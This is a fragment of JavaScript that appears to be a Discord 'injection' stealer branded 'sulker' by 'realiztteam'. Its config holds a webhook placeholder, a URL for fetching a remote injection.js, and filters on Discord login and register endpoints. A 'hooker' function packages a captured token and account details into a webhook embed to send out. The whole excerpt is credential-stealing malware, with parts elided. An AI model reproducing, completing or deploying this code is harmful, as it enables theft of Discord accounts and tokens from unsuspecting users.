...
const CONFIG = {
    webhook: "%WEBHOOK%",
    injection_url: "https://raw.githubusercontent.com/RealiztTeam/discord-injection/refs/heads/main/injection.js",
    filters: {
        urls: [
            '/auth/login',
            '/auth/register',
...
const hooker = async (content, token, account) => {
    ...
    content["username"] = "sulker - cord injection";
    ...
    content["embeds"][0]["footer"] = {
        "text": "sulker discord injection - made by realiztteam",
        "icon_url": "https://avatars.githubusercontent.com/u/185640992?v=4",
    };
